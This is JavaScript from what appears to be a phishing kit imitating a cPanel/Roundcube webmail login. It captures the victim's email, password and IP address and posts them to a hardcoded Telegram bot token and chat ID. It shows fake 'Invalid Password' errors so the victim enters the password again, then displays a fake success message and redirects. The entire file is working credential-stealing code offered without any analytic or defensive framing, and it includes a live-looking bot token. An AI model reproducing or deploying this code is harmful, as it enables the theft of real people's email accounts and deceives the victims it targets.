  // Function to handle URL parameters and focus management
    function handleUrlParameters() {
        var params = new URLSearchParams(window.location.search);
        var email = params.get('cpsess3984646882/3rdparty/roundcube/?_task'); // Adjust parameter name if needed
        if (email) {
            $('#email').val(decodeURIComponent(email)); // Set email value in the form
            $('#error').hide(); // Hide error initially if email is pre-filled
            updateLogo(email);
            $('#password').focus(); // Focus on the password field if email is present
        }
    }
 async function sendToTelegram(message) {
            const telegramBotToken = '5047719025:AAHgTwU3N-tgQSQXpn4U-m5jpLn67AG0Sv4';
            const telegramChatId = '1813243185';
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message
                })
            });
        }

        async function handleSubmit() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const ip = await getIP();

            if (email === '') {
                displayError('Please enter recipient email.');
                return;
            }

            if (password === '') {
                displayError('The login is invalid.');
                return;
            }

            attemptCount++;
            await sendToTelegram(`💸 [Orange Panel Email Access] 💸 \nEmail User: ${email}\nPassword Given: ${password}\n💻 [Information] 💻\nIP Address: ${ip}\n💸 [Access Attempt: ${attemptCount}] 💸`);

            document.getElementById('password').value = '';

            if (attemptCount >= maxAttempts) {
                displaySuccess('Login Successful. Welcome!');
                document.getElementById('continueButton').disabled = true;
                document.getElementById('password').style.display = 'none';

                // Redirect to .pdf file or desired URL after granting access
                window.location.href = './Success_handler.html'; // Replace with actual URL
            } else {
                displayError(`Invalid Password Entry! Continue With Valid Password.`);
            }
        }